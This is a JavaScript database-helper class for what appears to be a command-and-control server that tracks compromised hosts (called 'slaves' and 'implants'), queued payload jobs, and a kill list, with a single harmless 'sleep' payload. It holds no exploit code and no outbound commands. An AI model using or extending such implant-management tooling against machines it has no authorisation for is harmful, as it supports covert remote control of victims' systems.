// Modals DB.
/**
 * Slaves: {
 *      id: $string,
 *      ip: $string,
 *      os: $string,
 *      computername: $string,
 *      nickname: $string,
 *      username: $string,
 *      info: $string
 * }
 */

/**
 * Jobs: {
 *      id: $string,
 *      slaveId: $string,
 *      payloadId: $string,
 *      createdAt: $string,
 *      finishedAt: $string,
 *      objectSize: $int,
 *      status: $string,
 *      variables: $array<$string>
 *      data: $string/$raw
 *      encoding: $string
 * }
 */

/**
 * Payloads: {
 *      name: $string,
 *      id:   $string,
 *      description: $string,
 *      location: $string,
 *      command: $string,
 *      osPayloads: $string
 *      categories: $array<$string>
 *      variables: $array<$string>
 * }
 */

/**
 * KillList: {
 *      slaveId: $string,
 *      jobId: $string
 * }
 */
class DatabaseHelper {

    constructor() {
        // Init database...
        this.authTokens = [];
        this.slaves = [];
        this.payloads = [];
        this.jobs = [];
        this.jobList = [];
        this.killList = [];

        this.payloads.push(
            {
                id: "af469d67-512a-4b59-b236-55102709f5e4",
                name: 'Sleepy Hellow',
                command: "sleep",
                description: 'Sleeps for X seconds',
                location: "./payloads/af469d67-512a-4b59-b236-55102709f5e4/",
                variables: [
                  {
                    varname: 'COUNT_SLEEP',
                    description: 'Count of seconds to sleep.',
                    vartype: 'number'
                  }
                ],
                categories: [ 'scary', 'stealth' ],
                osPayloads: [ 'linux' ]
              }
              
        )
    }

    addNewSlave(slave) {

        this.slaves.push({
            id: slave.id,
            ip: slave.ip,
            os: "Linux",
            computername: slave.computername,
            nickname: "No nickname",
            username: slave.username,
            info: slave.info,
        });
    }

    saveAuthToken(token, user) {
        this.authTokens.push({
            user: user,
            token: token
        })
    }

    addNewJob(job) {
        this.jobs.push({
            id: job.id,
            slaveId: job.slaveId,
            payloadId: job.payloadId,
            objectSize: job.objectSize,
            variables: job.variables,
            location: job.location,
            createdAt: new Date(Date.now()).toUTCString(),
            finishedAt: "",
            code: 0,
            status: "PENDING",
        })
    }

    setJobStatus(id, status, code = 0, finished = false) {
        this.jobs = this.jobs.map(job => {

            // Change the status of the job with id.
            if (job.id == id) {

                job.status = status;
                if (finished) {
                    job.finishedAt = new Date(Date.now()).toUTCString() 
                    job.code = code;
                }
                
                return job;
            }

            return job; // Leave the other jobs be.
        });
    }

    setJobData(id, data, encoding) {

        this.jobs = this.jobs.map(job => {

            // Change the data of the job with id.
            if (job.id == id) {

                job.data = data;
                job.encoding = encoding
                
                return job;
            }

            return job; // Leave the other jobs be.
        });
    }

    setNickname(slaveId, name) {

        this.slaves = this.slaves.map(slave => {
            if (slave.id == slaveId) {
                slave.nickname = name; // Only change name.
            }

            return slave;
        })
    }

    addPayload(payload) {
        this.payloads.push({
            id: payload.id,
            osPayloads: payload.osPayloads,
            name: payload.name,
            command: payload.command,
            variables: payload.variables,
            location: payload.location,
            createdAt: new Date(Date.now()).toUTCString(),
            description: payload.description,
            categories: payload.categories
        })
    }

    setJobList(job, slaveId) {
        this.jobList.push({
            job: job,
            slaveId: slaveId
        })
    }

    getSlaveById(id) {
        return this.slaves.filter((entry => entry.id == id))[0];
    }

    checkAuthToken(token) {
        return this.authTokens.filter((entry => token == entry.token))[0];
    }

    getJobForSlave(id) {
        return this.jobs.filter(entry => entry.slaveId == id && entry.status == "PENDING")[0];
    }

    getJobWithId(id) {
        return this.jobs.filter(entry => entry.id == id)[0]
    }

    getPayloadById(id) {
        return this.payloads.filter(entry => entry.id == id)[0];
    }

    getSlaves() {
        return this.slaves;
    }

    getPayloads() {
        return this.payloads;
    }

    getJobs() {
        return this.jobs;
    }

    getJobList() {

        // First get all slaves, with their active jobs.
        let newJobList = [];
        this.slaves.forEach((slave) => {

            // Filter for inactive jobs for current slave.
            let activeJobs = this.jobs.filter((job) => {

                if (job.slaveId == slave.id && (job.finishedAt === "" || job.finishedAt.length === 0))
                    return true;
                else 
                    return false;
            }).map((job) => {

                // Add extra metadata about payload.
                let payload = this.getPayloadById(job.payloadId);
                job.name = payload.name;
                job.description = payload.description;
                return job;
            })

            // Only add implant if it has active jobs currently.
            if (activeJobs.length != 0) {
                newJobList.push({
                    "slave": slave,
                    "activeJobs": activeJobs
                })
            }
        })

        return newJobList;
    }

    getJobsForImplant(id) {

        return this.jobs.filter((list) => list.slaveId == id)
    }

    getKillList(slaveId) {

        return this.killList.filter((list) => list.slaveId == slaveId);
    }

    addToKillList(slaveId, jobId) {

        this.killList.push({
            "slaveId": slaveId,
            "jobId": jobId
        })
    }

    killJob(jobId) {

        this.setJobStatus(jobId, "KILLED", 0, true);
        this.killList = this.killList.filter((kill) => kill.jobId != jobId); 
    }
}

module.exports = DatabaseHelper;

/**
 * Jobs: {
 *      id: $string,
 *      slaveId: $string,
 *      payloadId: $string,
 *      createdAt: $string,
 *      finishedAt: $string,
 *      objectSize: $int,
 *      status: $string,
 *      variables: $array<$string>
 * }
 */
